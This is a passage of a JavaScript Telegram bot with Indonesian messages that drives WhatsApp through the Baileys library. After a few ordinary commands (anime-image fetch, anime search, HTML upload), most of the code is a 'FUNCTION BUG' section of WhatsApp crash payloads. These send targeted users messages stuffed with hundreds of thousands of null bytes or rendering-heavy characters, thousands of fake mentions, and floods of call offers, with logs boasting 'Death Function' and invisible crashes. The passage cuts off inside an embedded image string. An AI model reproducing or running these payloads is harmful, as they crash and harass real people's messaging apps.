    const validCategories = ['waifu', 'neko', 'shinobu', 'megumin', 'bully', 'cuddle', 'cry', 'hug', 'awoo', 'kiss', 'lick', 'pat', 'smug', 'bonk', 'yeet', 'blush', 'smile', 'wave', 'highfive', 'handhold', 'nom', 'bite', 'glomp', 'slap', 'kill', 'kick', 'happy', 'wink', 'poke', 'dance', 'cringe'];
    
    if (!validCategories.includes(category)) {
        return ctx.reply(`❌ ☇ Kategori tidak valid. Kategori yang tersedia: ${validCategories.slice(0, 10).join(', ')}...`);
    }

    try {
        const response = await axios.get(`https://api.waifu.pics/sfw/${category}`);
        
        await ctx.replyWithVideo(response.data.url, {
            caption: `<blockquote><pre>⬡═―—⊱ ⎧ WAIFU IMAGE ⎭ ⊰―—═⬡</pre></blockquote>🌸 Kategori: ${category}`,
            parse_mode: "HTML"
        });
    } catch (error) {
        await ctx.reply("❌ ☇ Gagal mengambil gambar waifu");
    }
});

bot.command("anime", checkPremium, async (ctx) => {
    const query = ctx.message.text.split(" ").slice(1).join(" ");
    if (!query) return ctx.reply("👀 ☇ Format: /anime <judul anime>");

    const waitMsg = await ctx.reply("⏳ ☇ Mencari anime...");

    try {
        const response = await axios.get(`https://api.jikan.moe/v4/anime?q=${encodeURIComponent(query)}&limit=5`);
        
        if (!response.data.data || response.data.data.length === 0) {
            await ctx.reply("❌ ☇ Anime tidak ditemukan");
            return;
        }

        const anime = response.data.data[0];
        const caption = `
<blockquote><pre>⬡═―—⊱ ⎧ ANIME INFO ⎭ ⊰―—═⬡</pre></blockquote>
🎬 <b>${anime.title}</b>
${anime.title_japanese ? `📝 ${anime.title_japanese}\n` : ''}
⭐ Rating: ${anime.score || 'N/A'}
📊 Status: ${anime.status}
📅 Episode: ${anime.episodes || 'Ongoing'}
🎭 Type: ${anime.type}
📺 Source: ${anime.source}

📖 <b>Sinopsis:</b>
${anime.synopsis ? anime.synopsis.substring(0, 500) + '...' : 'Tidak tersedia'}

🔗 <a href="${anime.url}">MyAnimeList</a>`;

        await ctx.replyWithVideo(anime.images.jpg.large_image_url, {
            caption: caption,
            parse_mode: "HTML",
            disable_web_page_preview: true
        });

    } catch (error) {
        await ctx.reply("❌ ☇ Gagal mencari anime");
    } finally {
        try { await ctx.deleteMessage(waitMsg.message_id); } catch {}
    }
});

let awaitingDeploy = {}; 
bot.command("vercall", async (ctx) => {
  const userId = ctx.from.id;
  awaitingDeploy[userId] = true;
  await ctx.reply("📄 Kirimkan kode HTML Anda sekarang (bisa sebagai teks atau file .html).");
});

bot.on("document", async (ctx) => {
  const userId = ctx.from.id;
  if (!awaitingDeploy[userId]) return;

  const file = ctx.message.document;
  if (!file.file_name.endsWith(".html")) {
    return ctx.reply("❌ File bukan HTML, kirim file berekstensi .html");
  }

  try {
    const fileLink = await ctx.telegram.getFileLink(file.file_id);
    const res = await axios.get(fileLink.href);
    const htmlContent = res.data;

    const formData = new FormData();
    formData.append("reqtype", "fileupload");
    formData.append("fileToUpload", Buffer.from(htmlContent, "utf-8"), {
      filename: file.file_name,
    });

    const upload = await axios.post("https://catbox.moe/user/api.php", formData, {
      headers: formData.getHeaders(),
    });

    delete awaitingDeploy[userId];
    await ctx.reply(`✅ HTML berhasil di-deploy!\nLink: ${upload.data}`);
  } catch (e) {
    console.error(e);
    await ctx.reply("❌ Gagal deploy HTML.");
  }
});

bot.on("text", async (ctx) => {
  const userId = ctx.from.id;
  if (!awaitingDeploy[userId]) return;

  const htmlContent = ctx.message.text;

  try {
    const formData = new FormData();
    formData.append("reqtype", "fileupload");
    formData.append("fileToUpload", Buffer.from(htmlContent, "utf-8"), {
      filename: "deploy.html",
    });

    const upload = await axios.post("https://catbox.moe/user/api.php", formData, {
      headers: formData.getHeaders(),
    });

    delete awaitingDeploy[userId];
    await ctx.reply(`✅ HTML berhasil di-deploy!\nLink: ${upload.data}`);
  } catch (e) {
    console.error(e);
    await ctx.reply("❌ Gagal deploy HTML.");
  }
});



//------------- FUNCTION BUG -------------//

async function R9X(sock, target, mention = false) {
  for (let i = 0; i < 99; i++) {
    var R9X = generateWAMessageFromContent(
      target,
      {
        groupStatusMessageV2: {
          message: {
            interactiveResponseMessage: {
              body: {
                text: "R9X",
                format: "DEFAULT"
              },
              nativeFlowResponseMessage: {
                name: "address_message",
                paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"R9X\",\"tower_number\":\"R9X\",\"city\":\"chindo\",\"name\":\"R9X\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"R9X | ${"\u0000".repeat(900000)}\"}}`,
                version: 3
              }
            }
          }
        }
      },
      { userJid: target }
    );

    await sock.relayMessage(
      target,
      R9X.message,
      mention
        ? {
            participant: { jid: target },
            messageId: R9X.key.id
          }
        : {}
    );
  }
}

async function BlankNewAndro(sock, target) {
  await sock.relayMessage(target, {
    viewOnceMessage: {
      message: {
        extendedMessage: {
          body: {
            text: "Brody" + "ꦽ".repeat(25000) + "ꦽ".repeat(5000),
          },
           nativeFlowMessage: {
               buttons: [
                 {
                    name: "catalog_message",
                    buttonParamsJson: JSON.stringify({
                    caption: "Kuntul Lagi".repeat(5000),
                   }),
                 },
                 {
                    name: "send_location",
                    buttonParamsJson: JSON.stringify({
                    caption: "Kuntul Lagi".repeat(5000),
                   }),
                 },
                 {
                    name: "mpm",
                    buttonParamsJson: JSON.stringify({
                    caption: "Kuntul Lagi".repeat(5000),
                   }),
                 },
                 {
                    name: "review_order",
                    buttonParamsJson: JSON.stringify({
                    caption: "Kuntul Lagi".repeat(5000),
                   }),
                 },
                 {
                    name: "call_permission_request",
                    buttonParamsJson: JSON.stringify({
                    caption: "Kuntul Lagi".repeat(5000),
                   }),
                 },
                 {
                    name: "cta_call",
                    buttonParamsJson: JSON.stringify({
                    caption: "Kuntul Lagi".repeat(5000),
                   }),
                 },
                 {
                     name: "review_and_pay",
                     buttonParamsJson: JSON.stringify({
                     caption: "Kuntul Lagi".repeat(5000),
                   }),
                },
             ],
           },
         },
       },
     },
   },
  {
    messageId: null,
    participant: { jid: target },
  }
);

  await sock.relayMessage(target, {
    viewOnceMessage: {
      message: {
        newsletterAdminInviteMessage: {
          newsletterJid: "999999999@newsletter",
          newsletterName: "Zams" + "ꦽ".repeat(25000),
          jpegThumbnail: "",
          caption: "Zams" + "ꦽ".repeat(15000),
          inviteExpiration: Date.now() + 1814400000, 
        },
      },
    },
  },
  {
    messageId: null,
    participant: { jid: target },
  }
);

  console.log(chalk.red(`Succes Send Death Function💀 To ${target}`));
}

async function FcIos(sock, target) {
  const iosxx = "\u0010";
  const iosx = "𑇂𑆵𑆴𑆿𑆿".repeat(15000);
  
    let message = {
      viewOnceMessage: {
        message: {
          locationMessage: {
            degreesLatitude: -9.09999262999,
            degreesLongitude: 199.99963118999,
            jpegThumbnail: null,
            name: yessss,
            address: korea,
            url: `https://FlavourKelra.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
          },
        },
      },
    };

    const msg = generateWAMessageFromContent(target, message, {});

    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [{
          tag: "meta",
          attrs: {},
          content: [{
              tag: "mentioned_users",
              attrs: {},
              content: [{
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined,
                }],
             }],
         }],
     });
   }

async function MakLoInpis(target) {
    const {
        encodeSignedDeviceIdentity,
        jidEncode,
        jidDecode,
        encodeWAMessage,
        patchMessageBeforeSending,
        encodeNewsletterMessage
    } = require("@whiskeysockets/baileys");
    const crypto = require("crypto");
    let devices = (
        await sock.getUSyncDevices([target], false, false)
    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

    await sock.assertSessions(devices);

    let node1 = () => {
        let map = {};
        return {
            mutex(key, fn) {
                map[key] ??= { task: Promise.resolve() };
                map[key].task = (async prev => {
                    try { await prev; } catch {}
                    return fn();
                })(map[key].task);
                return map[key].task;
            }
        };
    };

    let node2 = node1();
    let node3 = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
    let node4 = sock.createParticipantNodes.bind(sock);
    let node5 = sock.encodeWAMessage?.bind(sock);

    sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
        if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

        let patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);

        let ywdh = Array.isArray(patched)
            ? patched
            : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

        let { id: meId, lid: meLid } = sock.authState.creds.me;
        let omak = meLid ? jidDecode(meLid)?.user : null;
        let shouldIncludeDeviceIdentity = false;

        let nodes = await Promise.all(
            ywdh.map(async ({ recipientJid: jid, message: msg }) => {
                let { user: targetUser } = jidDecode(jid);
                let { user: ownPnUser } = jidDecode(meId);

                let isOwnUser = targetUser === ownPnUser || targetUser === omak;
                let y = jid === meId || jid === meLid;

                if (dsmMessage && isOwnUser && !y) msg = dsmMessage;

                let bytes = node3(
                    node5 ? node5(msg) : encodeWAMessage(msg)
                );

                return node2.mutex(jid, async () => {
                    let { type, ciphertext } = await sock.signalRepository.encryptMessage({
                        jid,
                        data: bytes
                    });

                    if (type === "pkmsg") shouldIncludeDeviceIdentity = true;

                    return {
                        tag: "to",
                        attrs: { jid },
                        content: [{
                            tag: "enc",
                            attrs: { v: "2", type, ...extraAttrs },
                            content: ciphertext
                        }]
                    };
                });
            })
        );

        return {
            nodes: nodes.filter(Boolean),
            shouldIncludeDeviceIdentity
        };
    };
    const startTime = Date.now();
    const duration = 10 * 60 * 50000;
    while (Date.now() - startTime < duration) {
        for (let i = 0; i < 100; i++) {
            let awik = crypto.randomBytes(32);
            let awok = Buffer.concat([awik, Buffer.alloc(8, 0x01)]);

            let {
                nodes: destinations,
                shouldIncludeDeviceIdentity
            } = await sock.createParticipantNodes(
                devices,
                { conversation: "y" },
                { count: "0" }
            );

            let lemiting = {
                tag: "call",
                attrs: {
                    to: target,
                    id: sock.generateMessageTag(),
                    from: sock.user.id
                },
                content: [{
                    tag: "offer",
                    attrs: {
                        "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
                        "call-creator": sock.user.id
                    },
                    content: [
                        { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
                        { tag: "audio", attrs: { enc: "opus", rate: "8000" } },

                        {
                            tag: "video",
                            attrs: {
                                orientation: "0",
                                screen_width: "1920",
                                screen_height: "1080",
                                device_orientation: "0",
                                enc: "vp8",
                                dec: "vp8"
                            }
                        },

                        { tag: "net", attrs: { medium: "3" } },

                        {
                            tag: "capability",
                            attrs: { ver: "1" },
                            content: new Uint8Array([1, 5, 247, 9, 228, 250, 1])
                        },

                        { tag: "encopt", attrs: { keygen: "2" } },

                        { tag: "destination", attrs: {}, content: destinations },

                        ...(shouldIncludeDeviceIdentity ? [{
                            tag: "device-identity",
                            attrs: {},
                            content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
                        }] : [])
                    ]
                }]
            };

            await sock.sendNode(lemiting);
            await new Promise(resolve => setTimeout(resolve, 500)); 
        }

        try {
            await sock.chatModify({ clear: true }, target);
            console.log("SUCCES");
        } catch (error) {
            console.error("GAGAL:", error);
        }
        await new Promise(resolve => setTimeout(resolve, 1000));
    }
    console.log(chalk.red("Succesfully Send Forclose New"));  
}

async function CStatus(sock, target) {
    let msg = generateWAMessageFromContent(target, {
        interactiveResponseMessage: {
            body: {
                text: "\u0000".repeat(9000),
                format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
                name: "address_message",
                paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"H\",\"address\":\"XT\",\"tower_number\":\"X\",\"city\":\"Medan\",\"name\":\"X\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"D | ${"\u0000".repeat(900000)}\"}}`,
                version: 3
            },
            contextInfo: {
                mentionedJid: Array.from({ length: 1999 }, (_, z) => `628${z + 72}@s.whatsapp.net`),
                isForwarded: true,
                forwardingScore: 7205,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: "120363395010254840@newsletter",
                    newsletterName: "유Ŧɍɇvøsɨᵾm-Ǥħøsŧ유",
                    serverMessageId: 1000,
                    accessibilityText: "idk"
                },
                statusAttributionType: "RESHARED_FROM_MENTION",
                contactVcard: true,
                isSampled: true,
                dissapearingMode: {
                    initiator: target,
                    initiatedByMe: true
                },
                expiration: Date.now()
            },
        }
    }, {});

    await sock.relayMessage(target, { groupStatusMessageV2: { message: msg.message } }, {
        participant: { jid: target }
    });
    const msg1 = {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "X",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "address_message",
                        paramsJson: "\x10".repeat(1045000),
                        version: 3
                    },
                    entryPointConversionSource: "call_permission_request"
                }
            }
        }
    };

    const msg2 = {
        ephemeralExpiration: 0,
        forwardingScore: 9741,
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
    };

    for (let i = 0; i < 10; i++) {
        const payload = generateWAMessageFromContent(target, msg1, msg2);

        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: payload.message
            }
        }, { messageId: payload.key.id, participant: { jid: target } });

        await sleep(1000);
    }

    await sock.relayMessage("status@broadcast", {
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target } }]
            }]
        }]
    });
}

// Crash Home Invis 100%
async function TsxDexbayy(sock, target) { 
    const msg = generateWAMessageFromContent(
      target,
      {
        ephemeralMessage: {
          message: {
            sendPaymentMessage: {
              noteMessage: {
                extendedTextMessage: {
                  text: "By : V-Arven Pro!!",
                  matchedText: "https://t.me/Bayysenpay",
                  description: "!.",
                  title: "",
                  paymentLinkMetadata: {
                    button: { displayText: "\x30" },
                    header: { headerType: 1 },
                    provider: { paramsJson: "{{".repeat(70000) }
                  }
                }
              }
            }
          }
        }
      },
      {}
    )

    await sock.relayMessage(
      target,
      {
        groupStatusMessageV2: {
          message: msg.message
        }
      },
      { messageId: null, participant: { jid: target } }
    )
}

async function ios(sock, target) {
    const statusAttributions = [];  
    for (let i = 0; i < 20000; i++) {
        const statusReshare = {
            source: "CHANNEL_RESHARE",
            duration: 7205,
            channelJid: `${i + 1}@newsletter`,
            channelMessageId: 7205,
            hasMultipleReshares: true
        };        
        statusAttributions.push({ statusReshare });
    }
    await sock.relayMessage(
        "status@broadcast",
        {
            viewOnceMessageV2Extension: {
                message: {
                    extendedTextMessage: {
                        text: "𑇂𑆵𑆴𑆿".repeat(20000),
                        textArgb: Math.random() * 2000,
                        backgroundArgb: Math.random() * 2000,
                        font: "SYSTEM",
                        inviteLinkGroupType: "DEFAULT",
                        paymentLinkMetadata: {
                          button: { displayText: " x" },
                          header: { headerType: 1 },
                          provider: { paramsJson: "\u0003".repeat(70000) }
                        },
                        contextInfo: {
                            forwardingScore: 9999999,
                            isForwarded: true,
                            quotedAd: {
                                advertiserName: " X ",
                                mediaType: "IMAGE",
                                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
                                caption: " X "
                            },
                            placeholderKey: {
                                remoteJid: "status@broadcast",
                                fromMe: false,
                                id: "ABCDEF1234567890"
                            },
                            externalAdReply: {
                                title: "x",
                                body: "𑇂𑆵𑆴𑆿".repeat(30000),
                                mediaType: "VIDEO",
                                renderLargerThumbnail: true,
                                sourceUrl: "https://t.me/primroseell",
                                mediaUrl: "https://t.me/primroseell",
                                containsAutoReply: true,
                                showAdAttribution: true,
                                ctwaClid: "ctwa_clid_example",
                                ref: "ref_example"
                            },
                            statusSourceType: "TEXT",
                            statusAttributionType: "RESHARED_FROM_MENTION",
                            statusAttributions: [
                                {
                                    type: "STATUS_MENTION",
                                    music: {
                                        authorName: "ell",
                                        songId: "1137812656623908",
                                        title: "𑇂𑆵𑆴𑆿".repeat(9000),
                                        author: "𑇂𑆵𑆴𑆿".repeat(9000),
                                        artistAttribution: "https://t.me/primroseell",
                                        isExplicit: true
                                    }
                                },
                                ...statusAttributions
                            ]
                        }
                    }
                }
            }
        },
        {
            statusJidList: [target]
        }
    );
}

async function Nukleotix(sock, target) {
  try {
    let msg = await generateWAMessageFromContent(target, {
      interactiveResponseMessage: {
        body : { text: "X", format: "DEFAULT" },
        nativeFlowResponseMessage: {
          name: "galaxy_message",
          paramsJson: "\u0000".repeat(100000)
        },
    contextInfo: {
       mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1900 },
                () =>
              "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              )
            ],
       entryPointCenversionSource: "galaxy_message"
      }
    }
  }, {});
  
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: msg.message
    }
  },
    {
      participant: { jid: target },
      messageId: msg.key.id
    });
  } catch (err) {
    console.log(err.message)
  }
}

async function btnStatus(target, mention) {
let pesan = await generateWAMessageFromContent(target, {
buttonsMessage: {
text: "🔥",
contentText: "Xataa",
footerText: "X",
buttons: [
{ buttonId: ".glitch", buttonText: { displayText: "⚡" + "\u0000".repeat(400000) }, type: 1 }
],
headerType: 1
}
}, {});

await sock.relayMessage("status@broadcast", pesan.message, {
messageId: pesan.key.id,
statusJidList: [target],
additionalNodes: [
{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target }, content: undefined }] }] }
]
});

if (mention) {
await sock.relayMessage(target, {
groupStatusMentionMessage: {
message: { protocolMessage: { key: pesan.key, type: 25 } }
}
}, {
additionalNodes: [
{ tag: "meta", attrs: { is_status_mention: "⚡" }, content: undefined }
]
});
}

const msg1 = {
        viewOnceMessage: {
            message: {
                groupStatusMessageV2: {
                    message: {
                        interactiveResponseMessage: {
                            nativeFlowResponseMessage: {
                                name: "galaxy_message",
                                paramsJson: "\x10" + "\u0000".repeat(1030000),
                                version: 3
                            }
                        }
                    }
                }
            }
        }
    };
  
  const msg2 = {
        viewOnceMessage: {
            message: {
                groupStatusMessageV2: {
                    message: {
                        interactiveResponseMessage: {
                            nativeFlowResponseMessage: {
                                name: "call_permission_request",
                                paramsJson: "\x10" + "\u0000".repeat(1030000),
                                version: 3
                            }
                        }
                    }
                }
            }
        }
    };
  
  const msg3 = {
        viewOnceMessage: {
            message: {
                groupStatusMessageV2: {
                    message: {
                        interactiveResponseMessage: {
                            nativeFlowResponseMessage: {
                                name: "address_message",
                                paramsJson: "\x10" + "\u0000".repeat(1030000),
                                version: 3
                            }
                        }
                    }
                }
            }
        }
    };
  
  for (const msg of [msg1, msg2, msg3]) {
    await sock.relayMessage(
      "status@broadcast", 
      msg,
      {
        messageId: null,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target }
                  }
                ]
              }
            ]
          }
        ]
      }
    );
  }
  
  await sock.relayMessage(
    "status@broadcast", 
    {
      statusJidList: [target],
      additionalNodes: [{
          tag: "meta",
          attrs: {
            status_setting: "allowlist"
          },
          content: [{
              tag: "mentioned_users",
              attrs: {},
              content: [{
                  tag: "to",
                  attrs: {
                    jid: target
                  }
              }]
          }]
      }]
    },
    {}
  );
}

async function gagunaRxVzDelayLg(sock, target) {
  try {
    const msg = generateWAMessageFromContent(
      target,
      proto.Message.fromObject({
        groupStatusMessageV2: {
          message: {
            interactiveResponseMessage: {
              body: {
                text: "huft....",
                format: "DEFAULT"
              },
              nativeFlowResponseMessage: { 
                name: "menu_options",
                paramsJson: JSON.stringify({
                  display_text: "\u0000".repeat(900000),
                  description: "\u0000".repeat(90000),
                  id: "Huft"
                }),
                version: 3
              }
            }
          }
        }
      }),
      {}
    );

    await sock.relayMessage(
      target, 
      msg.message, 
      { messageId: msg.key.id }
    );

    console.log("done ✅");

  } catch (err) {
    console.error("Error:", err);
  }
}

async function crashUi(sock, target) {
  const msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            contextInfo: {
              expiration: 1,
              ephemeralSettingTimestamp: 1,
              entryPointConversionSource: "WhatsApp.com",
              entryPointConversionApp: "WhatsApp",
              entryPointConversionDelaySeconds: 1,
              disappearingMode: {
                initiatorDeviceJid: target,
                initiator: "INITIATED_BY_OTHER",
                trigger: "UNKNOWN_GROUPS"
              },
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: [target],
              businessMessageForwardInfo: { 
                 businessOwnerJid: "13135550002@s.whatsapp.net"
              },
              quotedMessage: {
                callLogMesssage: {
                  isVideo: false,
                  callOutcome: "ONGOING",
                  durationSecs: "0",
                  callType: "VOICE_CHAT",
                  participants: [
                    {
                      jid: "13135550002@s.whatsapp.net",
                      callOutcome: "CONNECTED"
                    },
                    ...Array.from({ length: 10000 }, () => ({
                      jid: `1${Math.floor(Math.random() * 99999)}@s.whatsapp.net`,
                      callOutcome: "CONNECTED"
                    }))
                  ]
                }
              },
              externalAdReply: {
                showAdAttribution: false,
                renderLargerThumbnail: true
              }
            },
            header: {
              videoMessage: {
                url: "https://mmg.whatsapp.net/o1/v/t24/f2/m232/AQOS7xVULFd5Ekk1T8o8pWSq-j5UmHzUPG5sq0frfEogEtMRJ_FNjaT7rKYUSm-iImapgmKZ7iq5_9_CC8mSbD0me0ye2OcoyDxaqJU?ccb=9-4&oh=01_Q5Aa2AFf2ZI7JiJkIlqsek6JvJAGekHxXtN9qtw95RhN1meW8g&oe=68987468&_nc_sid=e6ed6c&mms3=true",
                mimetype: "video/mp4",
                fileSha256: "pctPKf/IwXKoCzQ7da4YrzWk+K9kaySQuWqfbA8h0FY=",
                fileLength: "847271",
                seconds: 7,
                mediaKey: "dA+Eu1vaexH4OIHRZbL8uZIND+CKA6ykw9B2OrL+DH4=",
                gifPlayback: true,
                height: 1280,
                width: 576,
                fileEncSha256: "GwTECHj+asNIHYh/L6NAX+92ob/LDSP5jgx/icqHWvk=",
                directPath: "/o1/v/t24/f2/m232/AQOS7xVULFd5Ekk1T8o8pWSq-j5UmHzUPG5sq0frfEogEtMRJ_FNjaT7rKYUSm-iImapgmKZ7iq5_9_CC8mSbD0me0ye2OcoyDxaqJU?ccb=9-4&oh=01_Q5Aa2AFf2ZI7JiJkIlqsek6JvJAGekHxXtN9qtw95RhN1meW8g&oe=68987468&_nc_sid=e6ed6c",
                mediaKeyTimestamp: "1752236759",
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAQwAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ0AAAB3AAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAFgAAAAcAHMAUgBHAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFhZWiAAAAAAAABvogAAOPUAAAOQWFlaIAAAAAAAAGKZAAC3hQAAGNpYWVogAAAAAAAAJKAAAA+EAAC2z3BhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABYWVogAAAAAAAA9tYAAQAAAADTLW1sdWMAAAAAAAAAAQAAAAxlblVTAAAAIAAAABwARwBvAG8AZwBsAGUAIABJAG4AYwAuACAAMgAwADEANv/bAEMABgQFBgUEBgYFBgcHBggKEAoKCQkKFA4PDBAXFBgYFxQWFhodJR8aGyMcFhYgLCAjJicpKikZHy0wLSgwJSgpKP/bAEMBBwcHCggKEwoKEygaFhooKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKP/AABEIAGQALQMBIgACEQEDEQH/xAAbAAEAAgMBAQAAAAAAAAAAAAAAAgMBBAYFB//EACsQAAICAQIFAwQCAwAAAAAAAAECAAMRBCEFEhMxUQcUQQYiYXEygUKx8P/EABcBAQEBAQAAAAAAAAAAAAAAAAABAgP/xAAZEQEBAAMBAAAAAAAAAAAAAAAAEQEhQTH/2gAMAwEAAhEDEQA/APgGl4Jq7bbKarOGZcBc366irGWODl3HKfsOc9gRnHMM+PNqxk6NTk6g2tzGwscKT8EH5/MoPOACeYA7g+Z0YqETPMfJjmPkyi/TaezUNVXWaFL2isGy1EALbbliML+TsPIlBjmPkzJDL/IEfuB7vEeFcR4dodFbrPboLUWxUP3MitULKywwQA6OCp/B7FWxqXLxLUXanVGqzVBbCtt/R51LE/JI7kn533nnvdY61K9jstS8tYLEhBknA8DJJ/ZMgSTjJ7bRvosa1+pzMqBtjjpgDt4xiHuZyCRXt4rUf6EqiBY1rNnITcY2QD5z4/7t2mbKLkqrtsqsWq3PTcqQr4ODg/OJVJvY7oiO7MiDCKTkKM5wPG5JkTN4hERKpERAyO8MMEjbbxMRAREQEREBERAREQEREBERARNvQ6CzWLc1dlKCpC7dSwKSNtgO5O/Yb9z2BI1JEIk7UNdj1sVLKSpKsGG3gjY/sSft39p7nmq6fP08dVefOM/wzzY/OMfGcyqxpdPdq9TTptJTZfqLnFddVSlndicBVA3JJOABOp9RvpLjP0nxHS1cb4E/B+vWz1DqrctgDn/NSVLKCoIGDjlJA5t+d4RrdVw7i2i13DrRTrdNel1Fh5cJYrAqfu22IHfbzOs9UvUjjfqHrtG/GvYLVoA6UJoqmSsliOZ/vJYk8q9zjCjYHOVz4mq4gEjOD32MCIhVuptbUXvbYKw7nJFdaov9KoAH9CV4iIEYiIH/2Q==",
                gifAttribution: "NONE"
              },
              hasMediaAttachment: false
            },
            body: {
              text: "ꦾ".repeat(50000)
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(20000),
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: ""
                },
                {
                  name: "galaxy_message",
                  buttonParamsJson: JSON.stringify({
                    flow_action: "navigate",
                    flow_action_payload: { screen: "CTZ_SCREEN" },
                    flow_cta: "ꦾ".repeat(50000),
                    flow_id: "UNDEFINEDONTOP",
                    flow_message_version: "9.903",
                    flow_token: "UNDEFINEDONTOP"
                  })
                }
              ]
            }
          }
        }
      }
    },
    {}
  );
  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
  await sock.relayMessage(
    target,
    {
      groupInviteMessage: {
        groupJid: "120363347113453659@g.us",
        inviteCode: "x",
        inviteExpiration: Date.now(),
        groupName: "؂ن؃؄ٽ؂ن؃".repeat(10000),
        caption:"ꦾ".repeat(50000), 
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAQwAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ0AAAB3AAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAFgAAAAcAHMAUgBHAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFhZWiAAAAAAAABvogAAOPUAAAOQWFlaIAAAAAAAAGKZAAC3hQAAGNpYWVogAAAAAAAAJKAAAA+EAAC2z3BhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABYWVogAAAAAAAA9tYAAQAAAADTLW1sdWMAAAAAAAAAAQAAAAxlblVTAAAAIAAAABwARwBvAG8AZwBsAGUAIABJAG4AYwAuACAAMgAwADEANv/bAEMABgQFBgUEBgYFBgcHBggKEAoKCQkKFA4PDBAXFBgYFxQWFhodJR8aGyMcFhYgLCAjJicpKikZHy0wLSgwJSgpKP/bAEMBBwcHCggKEwoKEygaFhooKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKP/AABEIAGQALQMBIgACEQEDEQH/xAAbAAEAAgMBAQAAAAAAAAAAAAAAAgMBBAYFB//EACsQAAICAQIFAwQCAwAAAAAAAAECAAMRBCEFEhMxUQcUQQYiYXEygUKx8P/EABcBAQEBAQAAAAAAAAAAAAAAAAABAgP/xAAZEQEBAAMBAAAAAAAAAAAAAAAAEQEhQTH/2gAMAwEAAhEDEQA/APgGl4Jq7bbKarOGZcBc366irGWODl3HKfsOc9gRnHMM+PNqxk6NTk6g2tzGwscKT8EH5/M